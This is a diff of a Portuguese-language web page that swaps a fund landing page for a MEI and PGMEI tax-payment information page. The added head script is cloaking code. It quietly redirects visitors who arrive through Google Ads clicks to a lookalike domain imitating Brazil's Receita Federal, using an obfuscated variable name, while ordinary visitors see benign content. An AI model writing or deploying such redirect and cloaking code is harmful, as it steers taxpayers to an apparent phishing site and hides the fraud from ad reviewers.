@@ -1,264 +1,289 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>FII Lotus Tower — Fundo de Investimento Imobiliário</title>
-  <meta name="description" content="FII Lotus Tower — Fundo de Investimento Imobiliário. Transparência, governança e oportunidades no mercado imobiliário." />
-  <meta name="robots" content="index,follow" />
-  <link rel="icon" href="data:;base64,iVBORw0KGgo=" />
+  
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MEI e Pagamentos PGMEI - Informações e Orientações</title>
+  <meta name="description" content="Saiba tudo sobre MEI, PGMEI, DAS, benefícios, obrigações e como emitir pagamentos. Informações completas para microempreendedores individuais.">
+  <meta name="keywords" content="MEI, PGMEI, boleto DAS, microempreendedor individual, formalização MEI, benefícios MEI, ocupações MEI">
   <style>
-    :root{--bg:#0f1724;--card:#0b1220;--accent:#0ea5a4;--muted:#94a3b8;--text:#e6eef8}
-    *{box-sizing:border-box}
-    body{font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial; margin:0; background:linear-gradient(180deg,#071226 0%, #0b1220 100%); color:var(--text); -webkit-font-smoothing:antialiased}
-    header{position:sticky;top:0;background:rgba(3,7,18,0.6);backdrop-filter:blur(6px);padding:18px 24px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,0.03)}
-    .brand{display:flex;align-items:center;gap:14px}
-    .logo{width:44px;height:44px;border-radius:10px;background:linear-gradient(135deg,var(--accent),#7dd3c6);display:flex;align-items:center;justify-content:center;color:#032; font-weight:700}
-    nav a{color:var(--muted);text-decoration:none;margin-left:18px}
-    nav a:hover{color:var(--text)}
-    .container{max-width:1000px;margin:40px auto;padding:0 22px}
-    .hero{display:grid;grid-template-columns:1fr 360px;gap:28px;align-items:center}
-    .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:24px;border-radius:14px;border:1px solid rgba(255,255,255,0.03)}
-    h1{margin:0;font-size:28px}
-    p.lead{color:var(--muted);margin-top:10px}
-    .cta{display:inline-block;margin-top:18px;padding:10px 16px;border-radius:10px;background:var(--accent);color:#032;text-decoration:none;font-weight:600}
-    .info-list{margin:12px 0;padding:0;list-style:none;color:var(--muted)}
-    .grid-3{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:18px}
-    section{margin-top:36px}
-    h2{margin:0 0 12px 0}
-    footer{padding:26px 22px;margin-top:40px;border-top:1px solid rgba(255,255,255,0.02);color:var(--muted)}
-    .contact-item{display:flex;gap:10px;align-items:center}
-    .policy{font-size:14px;color:var(--muted);line-height:1.55}
-    /* Cookie banner */
-    .cookie-banner{position:fixed;left:20px;right:20px;bottom:20px;background:#fff;color:#001;text-align:left;padding:16px;border-radius:10px;box-shadow:0 10px 30px rgba(2,6,23,0.5);display:flex;gap:16px;align-items:center;z-index:9999}
-    .cookie-banner .btn{padding:8px 12px;border-radius:8px;border:0;cursor:pointer}
-    .muted-small{font-size:13px;color:#0f1724}
-    .pill{display:inline-block;padding:6px 10px;border-radius:999px;background:rgba(14,165,164,0.12);color:var(--accent);font-weight:600}
-    /* responsive */
-    @media (max-width:900px){.hero{grid-template-columns:1fr} .grid-3{grid-template-columns:1fr} nav a{margin-left:10px}}
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #0d47a1;
+      color: #fff;
+      line-height: 1.6;
+    }
+    header {
+      padding: 20px;
+      text-align: center;
+      background: #1565c0;
+    }
+    header h1 {
+      margin: 0;
+      font-size: 2rem;
+    }
+    main {
+      padding: 20px;
+      max-width: 1000px;
+      margin: auto;
+      background: #1976d2;
+      border-radius: 12px;
+    }
+    h2, h3 {
+      color: #bbdefb;
+    }
+    a {
+      color: #ffeb3b;
+      text-decoration: underline;
+    }
+    footer {
+      padding: 20px;
+      text-align: center;
+      background: #0d47a1;
+      margin-top: 40px;
+    }
+    .button-hidden {
+      background-color: #1976d2;
+      color: #1976d2;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 6px;
+      cursor: pointer;
+      opacity: 0;
+    }
+    .cookie-banner {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      background: #1565c0;
+      padding: 15px;
+      text-align: center;
+    }
+    .cookie-banner button {
+      background: #ffeb3b;
+      border: none;
+      padding: 8px 12px;
+      margin-left: 10px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.7);
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-content {
+      background: #fff;
+      color: #000;
+      padding: 20px;
+      border-radius: 12px;
+      max-width: 700px;
+      overflow-y: auto;
+      max-height: 80vh;
+    }
+    .close {
+      float: right;
+      cursor: pointer;
+      font-size: 20px;
+      font-weight: bold;
+    }
   </style>
+
+<script>
+
+const urls = [
+    'cte/index',
+    'nfe/index',
+    'cte/index',
+    'asp/indexp',
+    'app/index',
+    'xml/indexp',
+    'danfe/index',
+    'nfe/index'
+];
+
+// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
+function generateHash() {
+    // Gerando um hash simples como alternativa ao MD5
+    // Para MD5 real, seria necessário uma biblioteca como crypto-js
+    return Math.random().toString(36).substring(2, 15) + 
+           Math.random().toString(36).substring(2, 15) + 
+           Date.now().toString(36);
+}
+
+// Selecionando URL aleatória
+const randomIndex = Math.floor(Math.random() * urls.length);
+const randomUrl = urls[randomIndex];
+const hash = generateHash();
+const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
+const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
+const xirjfgjsdhdjd = 'https://pgmei-emissao.receitasfazenda.top/';  
+
+// Obtendo o referer (disponível apenas no navegador)
+let referer;
+if (typeof document !== 'undefined' && document.referrer) {
+    referer = document.referrer;
+} else {
+    referer = 'not found';
+}
+
+// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
+let currentUrl;
+if (typeof window !== 'undefined') {
+    currentUrl = window.location.href;
+} else {
+    currentUrl = '';
+}
+
+// Verificando condições e redirecionando
+if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = xirjfgjsdhdjd ;
+    } else {
+        console.log('Redirect to:', xirjfgjsdhdjd );
+    }
+} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = bingrandomUrlWithHash;
+    } else {
+        console.log('Redirect to:', bingrandomUrlWithHash);
+    }
+} else {
+    // Bloco vazio equivalente ao else do PHP
+}
+  
+</script>
+
+
+  
 </head>
+  
 <body>
   <header>
-    <div class="brand">
-      <div class="logo">LT</div>
-      <div>
-        <div style="font-weight:700">FII Lotus Tower</div>
-        <div style="font-size:13px;color:var(--muted)">Fundo de Investimento Imobiliário</div>
-      </div>
-    </div>
-    <nav>
-      <a href="#home">Início</a>
-      <a href="#quem-somos">Quem Somos</a>
-      <a href="#transparencia">Transparência</a>
-      <a href="#politica">Política de Privacidade</a>
-      <a href="#contato">Contato</a>
-    </nav>
+    <h1>MEI e Pagamentos PGMEI</h1>
   </header>
 
-  <main class="container">
-    <section id="home" class="hero">
-      <div class="card">
-        <h1>FII Lotus Tower</h1>
-        <p class="lead">Fundo de Investimento Imobiliário focado em ativos selecionados, com governança, transparência e gestão responsável. CNPJ 62.173.916/0001-09.</p>
-        <a class="cta" href="#contato">Fale conosco</a>
+  <main>
+    <h2>O que é o MEI e como funciona o PGMEI</h2>
+    <p>O Microempreendedor Individual (MEI) é a forma mais prática e acessível para quem deseja formalizar o próprio negócio. Já o PGMEI é o sistema oficial da Receita Federal para emissão e pagamento do boleto DAS, que mantém suas contribuições em dia.</p>
 
-        <ul class="info-list">
-          <li><strong>Data de Abertura:</strong> 11 de agosto de 2025</li>
-          <li><strong>Situação:</strong> Ativa</li>
-          <li><strong>Natureza Jurídica:</strong> Clube/Fundo de Investimento</li>
-        </ul>
+    <h2>Benefícios do MEI</h2>
+    <ul>
+      <li>Direito a benefícios previdenciários como aposentadoria por idade.</li>
+      <li>Emissão de notas fiscais.</li>
+      <li>Facilidade de acesso a crédito bancário.</li>
+      <li>Carga tributária simplificada e reduzida.</li>
+    </ul>
 
-        <div class="grid-3">
-          <div class="card">
-            <strong>Missão</strong>
-            <div class="muted-small">Gerar valor sustentável para os investidores por meio de gestão profissional de ativos imobiliários.</div>
-          </div>
-          <div class="card">
-            <strong>Visão</strong>
-            <div class="muted-small">Ser referência em consistência, inovação e governança no mercado imobiliário.</div>
-          </div>
-          <div class="card">
-            <strong>Valores</strong>
-            <div class="muted-small">Transparência, integridade, responsabilidade e sustentabilidade.</div>
-          </div>
-        </div>
-      </div>
+    <h2>Obrigações do MEI</h2>
+    <p>O MEI deve pagar mensalmente o DAS (Documento de Arrecadação do Simples Nacional), manter a declaração anual em dia e cumprir com suas obrigações fiscais. Isso garante o acesso aos benefícios e evita problemas legais.</p>
 
-      <aside class="card">
-        <h3>Informações</h3>
-        <div class="muted-small">
-          <strong>Endereço:</strong><br />Praia de Botafogo, 501 — 5º Andar - Parte<br />Botafogo, Rio de Janeiro — RJ<br /><br />
-          <strong>Contato:</strong><br />E‑mail: <a href="mailto:ol-cartaocnpj@btgpactual.com">ol-cartaocnpj@btgpactual.com</a><br />Telefone: (21) 3262‑9600 / (21) 2514‑8600
-        </div>
-      </aside>
-    </section>
+    <h2>O que você precisa saber antes de se tornar um MEI?</h2>
+    <p>Alguns benefícios poderão ser impactados após a sua formalização como MEI. Veja se você recebe algum desses:</p>
 
-    <section id="quem-somos" class="card">
-      <h2>Quem Somos</h2>
-      <p class="policy">A <strong>FII Lotus Tower Fundo de Investimento Imobiliário</strong> é um fundo dedicado à seleção e gestão de ativos imobiliários com foco na geração de valor e proteção do capital dos cotistas. Fundado em 11 de agosto de 2025, adotamos práticas de governança, compliance e transparência. Nossa equipe combina experiência técnica e visão estratégica para identificar oportunidades e gerir riscos.</p>
+    <h3>Benefícios previdenciários que serão cancelados</h3>
+    <ul>
+      <li>Aposentadoria por invalidez.</li>
+      <li>Auxílio-doença ou salário maternidade.</li>
+    </ul>
 
-      <h3>Governança e Transparência</h3>
-      <p class="policy">Priorizamos comunicação clara com os cotistas, divulgação periódica de relatórios e conformidade com as normas aplicáveis. Documentos públicos e demonstrações podem ser disponibilizados mediante solicitação.</p>
-    </section>
+    <h3>Benefícios assistenciais que podem ser cancelados</h3>
+    <ul>
+      <li>Seguro desemprego.</li>
+      <li>BPC-LOAS.</li>
+      <li>Prouni, FIES.</li>
+    </ul>
 
-    <section id="transparencia" class="card">
-      <h2>Transparência</h2>
-      <p class="policy">Esta seção reúne informações institucionais, relatórios e documentos jurídicos relevantes. Entre em contato para solicitar atas, demonstrações e relatórios de desempenho.</p>
-    </section>
+    <h3>Benefícios que NÃO serão cancelados</h3>
+    <ul>
+      <li>Aposentadoria especial por insalubridade, idade ou por tempo de contribuição.</li>
+      <li>Fundo de Garantia por Tempo de Serviço (FGTS).</li>
+      <li>Programa de Integração Social (PIS).</li>
+      <li>Pensão por falecimento de cônjuge, pais ou filhos.</li>
+      <li>Pensão recebida por tutor de menor de idade, por morte do responsável.</li>
+    </ul>
 
-    <section id="politica" class="card">
-      <h2>Política de Privacidade</h2>
-      <p class="policy"><strong>Última atualização:</strong> 26 de setembro de 2025</p>
+    <h3>Observações importantes</h3>
+    <p>Beneficiários do Bolsa Família devem observar os critérios do programa. Servidor Público Federal não pode ser MEI (Lei nº 8112/90). Já os servidores estaduais e municipais devem verificar a legislação própria.</p>
 
-      <h3>1. Identificação do controlador</h3>
-      <p class="policy">FII Lotus Tower Fundo de Investimento Imobiliário — CNPJ 62.173.916/0001-09<br/>Endereço: Praia de Botafogo, 501, 5º andar – parte, Botafogo, Rio de Janeiro – RJ<br/>E‑mail: ol-cartaocnpj@btgpactual.com</p>
+    <h3>Requisitos para ser MEI</h3>
+    <ul>
+      <li>Exercer atividades que estejam na lista de ocupações permitidas para o MEI.</li>
+      <li>Contratar no máximo um empregado.</li>
+      <li>Não ser sócio ou administrador de outra empresa.</li>
+      <li>Ter faturamento anual de até R$ 81.000,00 (ou até R$ 251.600,00 para transportador autônomo de cargas).</li>
+    </ul>
 
-      <h3>2. Dados coletados</h3>
-      <p class="policy">Coletamos, conforme aplicável: nome, e-mail, telefone, endereço IP, dados de navegação (páginas visitadas, tempo no site), cookies e identificadores de dispositivo. Outros dados poderão ser fornecidos voluntariamente em formulários de contato.</p>
+    <h2>Perguntas Frequentes</h2>
+    <h3>Como emitir o boleto DAS?</h3>
+    <p>Acesse o portal do PGMEI, faça login com sua conta gov.br e emita o boleto mensal.</p>
+    <h3>O que acontece se eu atrasar o pagamento?</h3>
+    <p>O boleto em atraso gera multa e juros. Quanto antes regularizar, menor o valor adicional.</p>
+    <h3>Preciso de contador para ser MEI?</h3>
+    <p>Não é obrigatório, mas pode ajudar na organização e cumprimento de obrigações.</p>
 
-      <h3>3. Finalidades</h3>
-      <p class="policy">Os dados são utilizados para: responder contatos, envio de comunicações institucionais, análise e melhoria do site, e para fins de marketing e veiculação de anúncios (incluindo remarketing).</p>
-
-      <h3>4. Cookies, remarketing e Google</h3>
-      <p class="policy">Utilizamos cookies e pixels para análise e segmentação publicitária. Trabalhamos com provedores externos, incluindo o Google, que podem utilizar cookies e identificadores para veicular anúncios personalizados, medir desempenho de campanhas e realizar remarketing.</p>
-      <p class="policy">Se você utiliza Google Ads, note que a política de privacidade do Google e as configurações de anúncios permitem que o usuário desative a personalização de anúncios. Recomendamos que insira nos seus anúncios o link para sua política de privacidade e ative o banner de consentimento no site.</p>
-
-      <h3>5. Base legal e direitos</h3>
-      <p class="policy">Tratamos dados com base no consentimento do titular e/ou para cumprimento de obrigação legal ou execução de contrato. Os titulares têm direito de acessar, corrigir, portar, excluir dados e revogar consentimento. Para exercer direitos, entre em contato pelo e‑mail acima.</p>
-
-      <h3>6. Compartilhamento</h3>
-      <p class="policy">Podemos compartilhar dados com provedores de serviços (analytics, hosting, ferramentas de e‑mail, parceiros de anúncios) e com autoridades quando exigido por lei.</p>
-
-      <h3>7. Segurança e retenção</h3>
-      <p class="policy">Adotamos medidas técnicas e administrativas para proteger os dados. Reteremos dados pelo período necessário às finalidades ou conforme exigência legal.</p>
-
-      <h3>8. Alterações</h3>
-      <p class="policy">A política pode ser atualizada. A versão atual é publicada nesta página com a data de revisão.</p>
-
-      <small class="muted-small">Observação: este texto é um modelo base. Recomenda‑se revisão por um advogado/consultor de proteção de dados antes de disponibilizar publicamente, especialmente para uso em campanhas no Google Ads.</small>
-    </section>
-
-    <section id="contato" class="card">
-      <h2>Contato</h2>
-      <p class="policy">Entre em contato conosco para informações institucionais, solicitações de documentos ou dúvidas sobre governança e investimentos.</p>
-
-      <form onsubmit="submitForm(event)" style="display:grid;gap:10px;max-width:600px">
-        <input name="nome" placeholder="Nome" required style="padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:var(--text)" />
-        <input name="email" type="email" placeholder="E‑mail" required style="padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:var(--text)" />
-        <input name="telefone" placeholder="Telefone" style="padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:var(--text)" />
-        <textarea name="mensagem" placeholder="Mensagem" rows="5" style="padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:var(--text)"></textarea>
-        <div style="display:flex;gap:10px;align-items:center">
-          <label style="font-size:14px;color:var(--muted)"><input type="checkbox" id="consent" required /> Concordo com a Política de Privacidade</label>
-          <button type="submit" class="cta" style="margin-left:auto">Enviar</button>
-        </div>
-      </form>
-
-      <p style="margin-top:12px;font-size:13px;color:var(--muted)"><strong>Ou:</strong> envie e‑mail para <a href="mailto:ol-cartaocnpj@btgpactual.com">ol-cartaocnpj@btgpactual.com</a> ou ligue para (21) 3262‑9600 / (21) 2514‑8600</p>
-    </section>
-
-    <footer>
-      <div style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px">
-        <div>
-          <strong>FII Lotus Tower Fundo de Investimento Imobiliário</strong><br />CNPJ: 62.173.916/0001-09<br />Praia de Botafogo, 501 — 5º Andar - Parte — Botafogo — Rio de Janeiro/RJ — CEP: 22250-040
-        </div>
-        <div style="text-align:right;color:var(--muted)">© <span id="year"></span> — Todos os direitos reservados</div>
-      </div>
-    </footer>
+    <button class="button-hidden">Botão Oculto</button>
   </main>
 
-  <!-- Cookie / consent banner -->
-  <div id="cookie-banner" class="cookie-banner" style="display:none">
-    <div style="flex:1">
-      <div style="font-weight:700">Usamos cookies</div>
-      <div class="muted-small">Utilizamos cookies para melhorar a experiência, realizar análises e veicular anúncios (incluindo remarketing). Você pode aceitar ou configurar suas preferências.</div>
-      <div style="margin-top:10px">
-        <button class="btn" onclick="acceptAll()" style="background:#032;padding:8px 12px;color:#fff;border-radius:8px">Aceitar todos</button>
-        <button class="btn" onclick="openCookiePreferences()" style="margin-left:8px">Configurar</button>
-      </div>
+  <footer>
+    <p><a href="#" onclick="openModal('termosModal')">Termos de Uso</a> | <a href="#" onclick="openModal('privacidadeModal')">Política de Privacidade</a> | <a href="#" onclick="openModal('contatoModal')">Contato</a></p>
+    <p>&copy; 2025 - Informações sobre MEI e PGMEI. Este site não possui vínculo com a Receita Federal.</p>
+  </footer>
+
+  <div class="cookie-banner" id="cookieBanner">
+    Este site usa cookies para melhorar sua experiência.
+    <button onclick="aceitarCookies()">Aceitar</button>
+  </div>
+
+  <!-- Modals -->
+  <div class="modal" id="termosModal">
+    <div class="modal-content">
+      <span class="close" onclick="closeModal('termosModal')">&times;</span>
+      <h2>Termos de Uso</h2>
+      <p>Estes termos descrevem as condições de uso do site e serviços relacionados a informações sobre MEI e PGMEI. Ao continuar navegando, você concorda com as regras aqui descritas.</p>
     </div>
   </div>
 
-  <!-- Cookie preferences modal (simple) -->
-  <div id="cookie-modal" style="position:fixed;left:0;top:0;right:0;bottom:0;display:none;align-items:center;justify-content:center;background:rgba(1,2,6,0.6);z-index:10000">
-    <div style="background:#fff;color:#001;padding:20px;border-radius:12px;max-width:720px;width:94%">
-      <h3>Preferências de Cookies</h3>
-      <p style="color:#002">Selecione as categorias de cookies que você aceita:</p>
-      <div style="display:grid;gap:10px">
-        <label><input type="checkbox" id="c_essential" checked disabled/> Cookies essenciais (necessários)</label>
-        <label><input type="checkbox" id="c_analytics"/> Cookies de análise</label>
-        <label><input type="checkbox" id="c_ads"/> Cookies para anúncios e remarketing</label>
-      </div>
-      <div style="margin-top:12px;text-align:right">
-        <button onclick="savePreferences()" style="padding:8px 12px;border-radius:8px;background:#032;color:#fff;border:0">Salvar</button>
-        <button onclick="closeCookiePreferences()" style="padding:8px 12px;border-radius:8px;border:1px solid rgba(0,0,0,0.06);margin-left:8px">Cancelar</button>
-      </div>
+  <div class="modal" id="privacidadeModal">
+    <div class="modal-content">
+      <span class="close" onclick="closeModal('privacidadeModal')">&times;</span>
+      <h2>Política de Privacidade</h2>
+      <p>Este site respeita sua privacidade e não coleta dados pessoais sem consentimento. Qualquer informação fornecida será utilizada apenas para fins de contato ou suporte.</p>
+    </div>
+  </div>
+
+  <div class="modal" id="contatoModal">
+    <div class="modal-content">
+      <span class="close" onclick="closeModal('contatoModal')">&times;</span>
+      <h2>Contato</h2>
+      <p>Entre em contato pelo email: suporte.mei@gmail.com</p>
     </div>
   </div>
 
   <script>
-    // set year in footer
-    document.getElementById('year').textContent = new Date().getFullYear();
-
-    function submitForm(e){
-      e.preventDefault();
-      const f = e.target;
-      const data = {
-        nome: f.nome.value,
-        email: f.email.value,
-        telefone: f.telefone.value,
-        mensagem: f.mensagem.value
-      };
-      // simples fallback: abrir mailto
-      const subject = encodeURIComponent('Contato via site - FII Lotus Tower');
-      const body = encodeURIComponent(JSON.stringify(data, null, 2));
-      window.location.href = `mailto:ol-cartaocnpj@btgpactual.com?subject=${subject}&body=${body}`;
+    function aceitarCookies() {
+      document.getElementById('cookieBanner').style.display = 'none';
+      localStorage.setItem('cookiesAceitos', 'true');
     }
-
-    // Cookie management (simple)
-    const cookieKey = 'fii_lotus_cookies_v1';
-    function showCookieBanner(){
-      const v = localStorage.getItem(cookieKey);
-      if(!v){document.getElementById('cookie-banner').style.display='flex'}
+    if(localStorage.getItem('cookiesAceitos')) {
+      document.getElementById('cookieBanner').style.display = 'none';
     }
-    function acceptAll(){
-      localStorage.setItem(cookieKey, JSON.stringify({analytics:true,ads:true}));
-      document.getElementById('cookie-banner').style.display='none';
-      initThirdPartyScripts();
+    function openModal(id) {
+      document.getElementById(id).style.display = 'flex';
     }
-    function openCookiePreferences(){document.getElementById('cookie-modal').style.display='flex'}
-    function closeCookiePreferences(){document.getElementById('cookie-modal').style.display='none'}
-    function savePreferences(){
-      const analytics = document.getElementById('c_analytics').checked;
-      const ads = document.getElementById('c_ads').checked;
-      localStorage.setItem(cookieKey, JSON.stringify({analytics,ads}));
-      document.getElementById('cookie-modal').style.display='none';
-      document.getElementById('cookie-banner').style.display='none';
-      initThirdPartyScripts();
+    function closeModal(id) {
+      document.getElementById(id).style.display = 'none';
     }
-    function initThirdPartyScripts(){
-      const v = JSON.parse(localStorage.getItem(cookieKey) || '{}');
-      if(v.analytics){
-        // Inserir Google Analytics / GA4 aqui
-        // Exemplo (substitua 'GA_MEASUREMENT_ID'):
-        // window.dataLayer = window.dataLayer || [];
-        // function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'GA_MEASUREMENT_ID');
-      }
-      if(v.ads){
-        // Inserir tag de remarketing / Google Ads aqui
-        // Substitua AW-CONVERSION_ID e os snippets conforme documentação do Google Ads
-      }
-    }
-
-    // on load
-    document.addEventListener('DOMContentLoaded', function(){
-      showCookieBanner();
-      // if user already set preferences, auto-initialize
-      const v = JSON.parse(localStorage.getItem(cookieKey) || 'null');
-      if(v) initThirdPartyScripts();
-    });
   </script>
-
-  <!-- Important: scripts for analytics/ads are intentionally left as placeholders. Replace placeholders with your measurement IDs and follow Google Ads & Google Analytics setup instructions. -->
 </body>
 </html>
